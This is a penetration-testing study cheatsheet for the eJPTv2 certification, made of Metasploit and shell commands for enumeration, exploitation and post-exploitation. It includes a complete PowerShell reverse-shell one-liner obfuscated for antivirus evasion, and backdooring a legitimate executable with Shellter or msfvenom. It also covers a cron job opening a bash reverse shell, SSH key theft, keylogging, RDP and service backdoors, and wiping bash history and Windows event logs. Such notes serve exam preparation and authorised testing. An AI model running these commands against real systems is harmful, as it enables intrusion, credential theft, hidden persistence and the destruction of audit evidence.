# eJPTv2 Cheatsheet
- To Do
  - Finish 3.3
  - Finish 3.4
  - Rewatch 3.1
  - Rewatch 1.1, 1.2, 1.3, 1.4
  - Review old notes
  - Take Exam

[General](#General) | 
[Information Gathering and Enumeration](#Information-Gathering-and-Enumeration) | 
[Exploitation](#Exploitation) | 
[Post-Exploitation](#Post-Exploitation) |

# General
- [Metasploit](#Metasploit)
- [Resource Scripts](#Resource-Scripts)
- [tmux](#tmux)
- [windows-resources](#windows-resources)

## Metasploit
```
sudo apt update
sudo apt install metasploit-framework

sudo systemctl enable postgresql
sudo systemctl start postgresql
systemctl status postgresql

msfdb
sudo msfdb init
sudo msfdb reinit
sudo msfdb status
```
```
sudo service postgresql start
service postgresql status

msfconsole -q
db_status

workspace -a <workspace>
workspace

setg RHOSTS <ip>
setg RHOST <ip>
```
```
sessions -l
sessions -i <session_id>
sessions -k <session_id>
```
```
meterpreter > background (or Ctrl + Z)
```
```
meterpreter > ps
meterpreter > ps -S <process>
meterpreter > pgrep <process>
meterpreter > migrate <pid>
meterpreter > migrate -N explorer.exe
meterpreter > migrate -N lsass.exe
meterpreter > getpid
```
```
Hold Ctrl + M + L to clear screen
```
```
hosts
services
creds
analyze

vulns
vulns -p <port>
```
```
connect <ip> <port>
```

## Resource Scripts
```
/usr/share/metasploit-framework/scripts/resource
```
```
use multi/handler
set payload <payload>
set LHOST <ip>
set LPORT <port>
exploit

vi handler.rc
use multi/handler
set PAYLOAD <payload>
set LHOST <ip>
set LPORT <port>
exploit

msfconsole -r handler.rc
```
```
msf6 > resource handler.rc
```
```
msf6 > use multi/handler
msf6 > set PAYLOAD <payload>
msf6 > set LHOST <ip>
msf6 > set LPORT <port>
msf6 > exploit
^C
msf6 > makerc handler.rc
```

## tmux
```
tmux
tmux ls
tmux attach -t <session_id>
```
```
Ctrl + B, D — Detach from the current session.
Ctrl + B, C — Create a new window.
Ctrl + B, 0 (1,2...) — Move to a specific window by number.
```

## windows-resources
- `/usr/share/windows-resources/`
- `/usr/share/windows-resources/binaries/`

# Information Gathering and Enumeration
- [FTP](#FTP)
- [HTTP](#HTTP)
  - [WMAP](#WMAP)
- [metasploit-autopwn](#metasploit-autopwn)
- [MySQL](#MySQL)
- [Nessus](#Nessus)
- [Port Scanning](#Port-Scanning)
- [SMB/Samba](#SMBSamba)
- [SMTP](#SMTP)
- [SSH](#SSH)
- [Wordlists](#Wordlists)

```
set USER_FILE <wordlist>
set PASS_FILE <wordlist>
set USERNAME <username>
set PASSWORD <password>
set VERBOSE <boolean>
set STOP_ON_SUCCESS <boolean>
```
- Set these options accordingly and as needed for brute-force attacks.

## FTP
```
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
```

## HTTP
```
use auxiliary/scanner/http/http_version
```
- Change `RPORT` and `SSL` if dealing with HTTPS.

```
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/options
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/dir_scanner
```
```
use auxiliary/scanner/http/files_dir
```
- Can specify `EXT` to focus on specific file extension.

```
use auxiliary/scanner/http/http_login
set AUTH_URI <directory>
set --clear USERPASS_FILE
```
- `unset USERPASS_FILE` reverts to default value.

```
use auxiliary/scanner/http/apache_userdir_enum
```
- Apache only.

```
use auxiliary/scanner/http/http_put
```
- Change `PATH` to directory being tested.
- Change `FILEDATA` and `FILENAME` accordingly if uploading a payload.

```
curl http://<ip>:<port>
curl http://<ip>/robots.txt
```
```
curl http://<ip>/<directory>/
```
- Check if directory listing (Apache) is enabled i.e. `Index of /<directory>`.

### WMAP
```
load wmap
wmap_sites -h
wmap_sites -a <ip>
wmap_sites -l
wmap_targets -h
wmap_targets -t http://<ip>
wmap_targets -l
```
- Web app vulnerability scanner.
- Uses built-in MSF modules.
- Available as MSF plugin (`wmap.rb`).

```
wmap_run -h
wmap_run -t
wmap_run -e

wmap_vulns -h
wmap_vulns -l
```

## metasploit-autopwn
```
load db_autopwn
db_autopwn -p -t
db_autopwn -p -t -PI <port>
```
- https://github.com/hahwul/metasploit-autopwn
- No longer in official MSF distro.

## MySQL
```
use auxiliary/scanner/mysql/mysql_version
```
```
use auxiliary/scanner/mysql/mysql_login
```
- Prioritize `root` account.

```
use auxiliary/admin/mysql/mysql_enum
```
- Includes account enumeration - hashes, privileges.
  - https://crackstation.net/
  - Hashcat:
    - `echo <hash> > hash`
    - `hashcat -m300 -a0 hash /usr/share/wordlists/rockyou.txt`
    - `cat .hashcat/hashcat.potfile`

```
use auxiliary/admin/mysql/mysql_sql
```
- Non-`root` account may not work i.e. access denied.
- Other SQL: `set SQL show databases;`

```
use auxiliary/scanner/mysql/mysql_schemadump
```

```
use auxiliary/scanner/mysql/mysql_file_enum
set FILE_LIST <wordlist>
```

```
use auxiliary/scanner/mysql/mysql_hashdump
```

```
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST <wordlist>
```

```
mysql -h <ip> -u root -p

MySQL [(none)]>
MySQL [(none)]> show databases;
```

## Nessus
```
db_import <filename>
```
- Export scan results to .nessus (XML) file.

## Port Scanning
```
nmap -Pn -sV <ip>
```
- Useful flags
  - `-p<port>`
  - `-p-`
  - `-F`
  - `-O`
  - `-sC`
  - `-A`
  - `-sU`
  - `-sn`
  - `-T<0 to 5>`

```
nmap -Pn -sV <ip> -oX results
db_import results
```
```
db_nmap -Pn -sV <ip>
```
```
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/discovery/udp_sweep
```

## SMB/Samba
```
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
```
```
use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
```
```
use auxiliary/scanner/smb/smb_login
```
- Prioritize `administrator` account.

```
nmap -Pn -sV -p445 --script=smb-os-discovery <ip>
```

```
smbclient -L \\\\<ip>\\ -U <username>

smbclient -L \\\\<ip>\\<share> -U <username>
smb: \> ls
smb: \> cd <directory>
smb: \> get <filename>
smb: \> exit
```
```
smbclient -L <ip> -N
rpcclient -U "" -N <ip>
```
- If successful, anonymous connection (null session) is allowed.

```
nmblookup -A <ip>
```

## SMTP
```
nmap -Pn -sV -p25 --script=banner <ip>
```
```
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/smtp/smtp_enum
```

## SSH
```
use auxiliary/scanner/ssh/ssh_version
```
```
use auxiliary/scanner/ssh/ssh_login
```
- Opens a reverse command shell (non-meterpreter) with credentials found.

```
use auxiliary/scanner/ssh/ssh_enumusers
```

## Wordlists
```
/usr/share/wordlists/
/usr/share/wordlists/rockyou.txt
```
```
/usr/share/metasploit-framework/data/wordlists/
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/http_default_users.txt
/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
/usr/share/metasploit-framework/data/wordlists/namelist.txt
/usr/share/metasploit-framework/data/wordlists/directory.txt
```
```
/usr/share/metasploit-framework/data/wmap/
/usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
/usr/share/metasploit-framework/data/wmap/wmap_files.txt
```

# Exploitation
- FTP
  - [ProFTPD 1.3.3c](#ProFTPD-133c) 
  - [vsftpd 2.3.4](#vsftpd-234)
- HTTP
  - [BadBlue httpd 2.7](#BadBlue-httpd-27)
  - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
- SMB/Samba
  - [EternalBlue](#EternalBlue)
  - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
- Others
  - [XODA 0.4.5](#XODA-045)
  - [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
- [ARP Poisoning](#ARP-Poisoning)
- [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
- [MSF Payloads and Listeners](#MSF-Payloads-and-Listeners)
  - [msfvenom](#msfvenom)
- [Linux Compilation](#Linux-Compilation)
- [Windows Cross-Compilation](#Windows-Cross-Compilation)

## FTP
### ProFTPD 1.3.3c
```
use exploit/unix/ftp/proftpd_133c_backdoor
```

### vsftpd 2.3.4
```
use exploit/unix/ftp/vsftpd_234_backdoor
```

## HTTP
### BadBlue httpd 2.7
```
use exploit/windows/http/badblue_passthru
```

### Rejetto HttpFileServer 2.3
```
use exploit/windows/http/rejetto_hfs_exec
```
```
searchsploit -m 39161

cd ~/Desktop
cp /usr/share/windows-resources/binaries/nc.exe ./
python -m SimpleHTTPServer 80

vi 39161.py
Change ip_addr and local_port
nc -nvlp <port>

python 39161.py <ip> <port>
```

## SMB/Samba
### EternalBlue
```
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```
- SMBv1 only.

### Samba smbd 3.X - 4.X
```
use exploit/linux/samba/is_known_pipename
```

## Others
### XODA 0.4.5
```
use exploit/unix/webapp/xoda_file_upload
```
- Set `TARGETURI` accordingly.

### Exploit Database Binary Exploits
- https://gitlab.com/exploit-database/exploitdb-bin-sploits

## ARP Poisoning
```
echo 1 > /proc/sys/net/ipv4/ip_forward
cat /proc/sys/net/ipv4/ip_forward
```
```
arpspoof -i <interface> -t <ip1> -r <ip2>
```
```
sudo wireshark -i <interface> -k
```

## AV Evasion and Obfuscation
```
sudo apt install shellter -y

sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32 -y
```
```
mkdir ~/Desktop/AVBypass
cp /usr/share/windows-resources/binaries/vncviewer.exe ~/Desktop/AVBypass/vncviewer.exe

cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```
- Backup of EXE at `/usr/share/windows-resources/shellter/Shellter_Backups`.
- Select Stealth mode - `vncviewer.exe` will function normally.

```
cd ~/Desktop/AVBypass
git clone https://github.com/danielbohannon/Invoke-Obfuscation

sudo apt install powershell -y
```
```
$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
- https://github.com/swisskyrepo/PayloadsAllTheThings
- Remove `powershell -nop -c` and double-quotes `"`, then save as `shell.ps1`.

```
pwsh
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation
```
```
SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
ENCODING
1
```
```
BACK

SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
AST
ALL
1
```

## MSF Payloads and Listeners
- 64-bit (`x64`) payload cannot run on 32-bit architecture.
- Staged payload (exploit and shellcode sent separately).
- Non-staged/inline payload (exploit and shellcode sent together).
  - `windows/x64/meterpreter/reverse_tcp` is staged.
  - `windows/x64/meterpreter_reverse_tcp` is non-staged/inline.

```
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp

windows/meterpreter/bind_tcp
windows/x64/meterpreter/bind_tcp

linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
```
```
use multi/handler
set payload <payload>
set LHOST <ip>
set LPORT <port>
```
- For quick reference.

### msfvenom
#### Generating Payloads
- https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

```
msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>
```
- `<architecture>`: `x86`, `x64`
- `<payload>`: Pick your poison from `msfvenom --list payloads`.
- `<format>`: Pick your poison from `msfvenom --list formats` e.g. `elf`, `exe`, `aspx`.

#### Encoding Payloads
- Not effective against modern AVs.

```
msfvenom --list encoders
```
- `x86/shikata_ga_nai` is the best encoder option.

```
msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f <format> > <filename>
```
- Having more iterations increases the chances of evading AVs.

#### Injecting Payloads into Window PEs
```
msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -i <iteration> -e <encoder> -f exe -x <PE_1> > <PE_2>
```
- `-k` will preserve the original functionality of `<PE_1>`; may not work for every PE.

## Linux Compilation
```
searchsploit -m 40839

gcc -pthread 40839.c -o dirty -lcrypt
```

## Windows Cross-Compilation
```
sudo apt-get install mingw-w64 gcc
```
```
searchsploit -m 9303

i686-w64-mingw32-gcc 9303.c -o exploit
i686-w64-mingw32-gcc 9303.c -o exploit_32 -lws2_32
```
- Use 32-bit if unsure of target architecture.

# Post-Exploitation
- [Cleanup Resource Scripts](#Cleanup-Resource-Scripts)
- [Clear Linux History](#Clear-Linux-History)
- [Clear Windows Event Logs](#Clear-Windows-Event-Logs)
- [Keylogging](#Keylogging)
- [Linux Local Enumeration](#Linux-Local-Enumeration)
- [Linux Persistence Via Cron Jobs](#Linux-Persistence-Via-Cron-Jobs)
- [Linux Persistence Via SSH Keys](#Linux-Persistence-Via-SSH-Keys)
- [Pivoting](#Pivoting)
- [SUDO Privileges](#SUDO-Privileges)
- [SUID Binaries](#SUID-Binaries)
- [Transfer Files](#Transfer-Files)
- [Upgrade Shells](#Upgrade-Shells)
- [Windows Local Enumeration](#Windows-Local-Enumeration)
- [Windows Persistence Via RDP](#Windows-Persistence-Via-RDP)
- [Windows Persistence Via Services](#Windows-Persistence-Via-Services)
- [Working Directories](#Working-Directories)

## Cleanup Resource Scripts
```
meterpreter > resource <filename>
```

## Clear Linux History
```
cat /dev/null > ~/.bash_history
history -c
```

## Clear Windows Event Logs
```
meterpreter > clearev
```

## Keylogging
```
meterpreter > getdesktop
```
```
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```
```
meterpreter > migrate -N winlogon.exe
```

## Linux Local Enumeration
### Enumerating System Information
```
meterpreter > sysinfo

hostname
cat /etc/issue && cat /etc/*release
uname -a
uname -r
env
lscpu
free -h
df -h
lsblk
dpkg -l
cat /etc/shells
```

### Enumerating Users & Groups
```
meterpreter > getuid

id
cat /etc/passwd
ls -l /home
groups
groups <username>
who
w
last
lastlog
```
- `uid=0` is root.

### Enumerating Network Information
```
meterpreter > ifconfig
meterpreter > netstat
meterpreter > route
meterpreter > arp

ip a s
arp -a
cat /etc/networks
cat /etc/hostname
cat /etc/hosts
cat /etc/resolv.conf
```

### Enumerating Processes & Cron Jobs
```
meterpreter > ps
meterpreter > ps -S <process>
meterpreter > pgrep <process>

ps --help all
ps
ps aux
ps aux | grep root
ps aux | grep <process>
ps aux | grep -i <keyword>
top
crontab -l
crontab -l -u <username>
ls -al /etc/cron*
cat /etc/crontab
cat /etc/cron*
```

### Automating Linux Local Enumeration 
```
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_system  
use post/linux/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.

### LinEnum
```
meterpreter > cd /tmp
meterpreter > upload /root/linenum.sh
meterpreter > ls
meterpreter > shell

/bin/bash -i
chmod +x linenum.sh
./linenum.sh
```
- https://github.com/rebootuser/LinEnum

## Linux Persistence Via Cron Jobs
```
ps -ef | grep cron

cat /etc/cron*
ls -al /etc/cron*

echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron

crontab -i cron
crontab -l
```
```
nc -nvlp <port>
```

## Linux Persistence Via SSH Keys
```
ssh <username>@<ip>
cat .ssh/id_rsa

scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
chmod 400 id_rsa
ssh -i id_rsa <username>@<ip>
```

## Pivoting
```
meterpreter > ipconfig
meterpreter > arp
```
```
meterpreter > run autoroute -s <subnet>
meterpreter > run autoroute -p
```
- Use CIDR notation for `<subnet>`.

```
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip2>
```
```
meterpreter > portfwd add -l <port_local> -p <port_remote> -r <ip2>
meterpreter > portfwd list

netstat -an | grep LISTEN
nmap -Pn -sV -p<port_local> localhost
```
```
use <exploit>
set RHOSTS <ip2>
set RPORT <port_remote>
set payload windows/meterpreter/bind_tcp
```
- `LPORT` will be opened on `<ip2>`.

```
meterpreter > upload /root/tools/static-binaries/nmap /tmp/nmap
```

## SUDO Privileges
```
sudo -l
```
- https://gtfobins.github.io/

## SUID Binaries
```
find / -user root -perm -4000 -exec ls -ldb {} \;
```
- https://gtfobins.github.io/

## Transfer Files
- Set Up A Web Server With Python
```
python -m SimpleHTTPServer 80
python3 -m http.server 80
```
- Windows: `certutil -urlcache -f http://<ip>/<filename> <filename>`
- Linux: `wget http://<ip>/<filename>`


## Upgrade Shells
- Non-interactive to interactive
```
cat /etc/shells
/bin/bash -i
```
```
which python python3

python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
which python python3
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl + Z

echo $TERM
stty -a
stty raw -echo
fg

reset
export SHELL=bash
export TERM=xterm-256color
stty rows <rows> columns <columns>
```

- Non-meterpreter to meterpreter
```
sessions -u <session_id>
```
```
use post/multi/manage/shell_to_meterpreter
set LHOST <ip>
set SESSION <session_id>
set WIN_TRANSFER VBS
```

## Windows Local Enumeration
### Enumerating System Information
```
meterpreter > sysinfo

hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
dir /b/s eula.txt
```

### Enumerating Users & Groups
```
meterpreter > getuid
meterpreter > getprivs

whoami
whoami /priv
query user
net users
net user <username>
net localgroup
net localgroup <group>
net localgroup Administrators

use post/windows/gather/enum_logged_on_users
set SESSION <session_id>
```

### Enumerating Network Information
```
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles
```
- Take note of APIPA addresses (`169.254.0.0/16`) in `arp -a` output.

### Enumerating Processes & Services
```
meterpreter > ps
meterpreter > ps -S <process>
meterpreter > pgrep <process>

net start
wmic service list brief
tasklist
tasklist /SVC

mkdir C:\Temp
schtasks /query /fo LIST /v > C:\Temp\schtasks.txt
exit

meterpreter > download C:\\Temp\\schtasks.txt

cat schtasks.txt
```
- `/SVC` shows the services hosted by the process.

### Automating Windows Local Enumeration
```
meterpreter > show_mount

use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/enum_applications
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/gather/enum_computers
use post/windows/gather/checkvm

cat /root/.msf4/loot/<filename>.txt
```
- Post-exploitation modules need to `set SESSION <session_id>`.
- `win_privs` will also check if UAC is enabled.

### JAWS - Just Another Windows Script
```
meterpreter > mkdir C:\\Temp
meterpreter > cd C:\\Temp
meterpreter > upload /root/jaws-enum.ps1
meterpreter > shell

powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename jaws-enum.txt
exit

meterpreter > download C:\\Temp\\jaws-enum.txt

cat jaws-enum.txt
```
- https://github.com/411Hall/JAWS

## Windows Persistence Via RDP
```
meterpreter > run getgui -e -u <username> -p <password>

xfreerdp /u:<username> /p:<password> /v:<ip>
```
- Meterpreter script to create a RDP backdoor.
- Password must meet complexity requirements.

## Windows Persistence Via Services
```
use exploit/windows/local/persistence_service
set SESSION <session_id>
```
- Admin or system privileges required.
- `RETRY_TIME` 5 seconds.
- Other settings more for blending in e.g. `SERVICE_NAME`.

```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
```

## Working Directories
- Windows: `C:\Temp`
- Linux: `/tmp`
